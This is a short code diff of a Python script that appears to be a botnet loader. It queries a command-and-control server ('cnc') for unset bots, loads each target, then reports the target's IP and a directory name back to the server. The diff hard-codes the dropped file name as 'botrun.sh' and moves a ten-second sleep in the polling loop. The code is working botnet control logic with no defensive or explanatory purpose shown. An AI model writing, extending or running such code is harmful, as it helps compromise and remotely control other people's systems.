@@ -34,7 +34,8 @@ cnc = "http://"+ip+":"+port
 def randomFileName(stringLength=10):
     """Generate a random string of fixed length """
     letters = string.ascii_lowercase
-    return (''.join(random.choice(letters) for i in range(stringLength)))+".sh"
+    return "botrun.sh"
+    # return (''.join(random.choice(letters) for i in range(stringLength)))+".sh"
 
 def execute(cmd):
     popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
@@ -101,6 +102,7 @@ def load(system):
 
 
 while(1):
+    time.sleep(10)
     logger.info("querying DB...")
     systems = list(requests.get(url = cnc+"/getbotunset").json().values())
     for system in systems:
@@ -109,5 +111,4 @@ while(1):
         requests.get(url=cnc+"/setloaded/"+system["ip"])
         requests.post(url=cnc+"/storeDirectory/"+system["ip"],json={"directoryName":directoryName})
         logger.info("Loaded "+system["ip"])
-    time.sleep(10)
 
